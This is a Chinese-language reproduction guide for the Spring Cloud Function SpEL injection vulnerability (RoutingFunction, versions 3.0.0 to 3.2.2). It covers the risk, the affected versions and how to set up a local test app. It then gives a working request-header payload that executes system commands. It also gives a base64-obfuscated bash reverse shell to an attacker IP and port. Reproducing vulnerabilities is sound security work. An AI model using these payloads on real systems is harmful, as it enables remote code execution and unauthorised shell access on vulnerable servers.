01

风险说明



       Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。

        由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码


02

影响版本




3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2 


03

漏洞复现




打开IDEA新建项目,选择Spring Initializr项目:

选择Next，选择 Spring web和 Function依赖，点击Finish

进入main的主函数直接运行:

这样就运行完成了，直接访问8080端口就ok了

根据官方提供的POC，在Header头中添加payload即可：

spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a Calculator")

Java中的getRunTime().exec()是不允许使用重定向和管道符符号的，所以进行一次base64编码就可以反弹shell了：

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx}|{base64,-d}|{bash,-i}")
